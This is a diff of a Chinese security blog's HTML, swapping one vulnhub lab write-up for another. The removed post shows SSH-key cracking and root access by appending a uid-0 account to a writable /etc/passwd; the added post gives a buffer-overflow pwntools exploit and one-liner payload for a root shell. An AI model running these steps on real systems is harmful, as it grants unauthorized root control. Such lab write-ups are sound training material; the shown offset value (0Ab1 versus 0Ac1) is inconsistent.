+<pre class=" language-bash"><code class="language-bash">msf-pattern_create -l 1000
 </code></pre>
-<p>然后就可以利用john爆破了</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009083024-l3yyxpg.png" alt="image">​</p>
-<p>密码就是<code>unicorn</code>​</p>
-<p>这里登录之前记得赋予id_rsa以600的权限</p>
-<pre class=" language-shell"><code class="language-shell">chmod 600 id_rsa
+<p>​<img src="/Blogimages/vulhub5/image-20231004155501-ipmd04c.png" alt="image">​</p>
+<p>如图我们可以知道是0Ac1覆盖了EIP，所以我们查找0Ac1前面有几个字符：</p>
+<pre class=" language-BASH"><code class="language-BASH">msf-pattern_offset -q 0Ab1
 </code></pre>
-<p>使用私钥登入即可</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009083256-lz3j5st.png" alt="image">​</p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid提权：</p>
-<pre class=" language-xml"><code class="language-xml">mowree@EvilBoxOne:/tmp$ find / -perm -u=s -type f 2>/dev/null
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/bin/mount
-/usr/bin/newgrp
-/usr/bin/passwd
-/usr/bin/umount
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/bin/gpasswd
-/usr/bin/su
+<p>​<img src="/Blogimages/vulhub5/image-20231004155554-gca8jgw.png" alt="image">​</p>
+<p>发现是62个，所以我们前面填充62位</p>
+<p>开始编写EXP：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004155722-nh400tm.png" alt="image">​</p>
+<p>这里看到<code>backdoor</code>​的地址是<code>0x08048676</code>​</p>
+<p>垃圾字符是62个</p>
+<p>写EXP：</p>
+<pre class=" language-pyrhon"><code class="language-pyrhon">from pwn import * 
+
+p = process("./add_record")
+backdoor = 0x8048676
+p.sendline(b'1')
+p.sendline(b'1')
+p.sendline(b'1')
+p.sendline(b'1')
+
+payload = b'a'*62 + p32(backdoor)
+p.sendline(payload)
+p.interactive()
 </code></pre>
-<p>无可利用的suid</p>
-<p>找内核漏洞：</p>
-<pre class=" language-xml"><code class="language-xml"> #   Name                                                                Potentially Vulnerable?  Check Result
- -   ----                                                                -----------------------  ------------
- 1   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
- 2   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
- 3   exploit/linux/local/vmwgfx_fd_priv_esc                              Yes                      The target appears to be vulnerable. vmwgfx installed
+<p>但是只能在目标系统上执行不能打远程环境，用这个</p>
+<pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import struct;print('aa\n1\n1\n1\n' + 'A'*62 + struct.pack('I',0x08048676))"</span> <span class="token operator">></span> payload
 </code></pre>
-<p>三个可能可以利用的，但是没有一个打的通的</p>
-<p>‍</p>
-<p>查找可写的文件</p>
-<pre class=" language-shell"><code class="language-shell">find / writable 2>/dev/null | grep -v run | grep -v proc | grep -v sys | grep -v var | grep -v usr | grep -v /dev | grep -v apache2 | grep -v ssl
+<p>然后运行</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> payload - <span class="token operator">|</span> ./add_record
 </code></pre>
-<p><img src="/Blogimages/vulhub6/image-20231009085029-4v4t27j.png" alt="image">​</p>
-<p>发现&#x2F;etc&#x2F;passwd文件可写，利用写入新账户提权</p>
-<pre class=" language-shell"><code class="language-shell">mowree@EvilBoxOne:/tmp$ echo 'root2:$1$u1UR7D3z$Zp7IvFndtV5XH/tYozXi6.:0:0:root:/root:/bin/sh' >> /etc/passwd
-mowree@EvilBoxOne:/tmp$ su root2
-Contraseña: 
-id
-su: Fallo de autenticación
-mowree@EvilBoxOne:/tmp$ id
-uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
-mowree@EvilBoxOne:/tmp$ su root2
-Contraseña: 
-# id
-uid=0(root) gid=0(root) grupos=0(root)
-</code></pre>
-<p>​<img src="/Blogimages/vulhub6/image-20231009085424-xlwsyp8.png" alt="image">​</p>
+<p>即可getshell，并且为root权限，短划线 <code>-</code>​ 表示将前一个命令的标准输出（在这种情况下是 “payload” 字符串）重定向到 .&#x2F;add_record 程序的标准输入，这样 .&#x2F;add_record 将从标准输入读取 “payload” 字符串</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231005100805-de6tdng.png" alt="image">​</p>
+<h3 id="Pwn参考链接"><a href="#Pwn参考链接" class="headerlink" title="Pwn参考链接"></a>Pwn参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Uv411j7fr/?spm_id_from=333.337.search-card.all.click&vd_source=4dbb58aa1f81a72a4d094fa71fd9907d">【星盟安全】PWN全集，从入门到精通，最通俗易懂的CTF，持续更新中_哔哩哔哩_bilibili</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/105115028">pwn学习—-定位溢出点位置_pwn 通过把编译 判断溢出位置-CSDN博客</a></p>
 <p>‍</p>
 
                 
@@ -952,18 +967,17 @@ uid=0(root) gid=0(root) grupos=0(root)
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/10/09/vulhub6/">
+                <a href="/2023/10/09/vulnhub6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="vulhub6">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="vulnhub6">
                         
-                        <span class="card-title">vulhub6</span>
+                        <span class="card-title">vulnhub6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -973,22 +987,21 @@ uid=0(root) gid=0(root) grupos=0(root)
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-09
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-09
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/" class="post-category">
-                                    未分类
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -999,13 +1012,13 @@ uid=0(root) gid=0(root) grupos=0(root)
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/10/08/vulhub5/">
+                <a href="/2023/10/03/QCMS_v6.01/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="vulhub5">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="QCMS_v6.01">
                         
-                        <span class="card-title">vulhub5</span>
+                        <span class="card-title">QCMS_v6.01</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1016,14 +1029,14 @@ uid=0(root) gid=0(root) grupos=0(root)
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/" class="post-category">
-                                    未分类
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
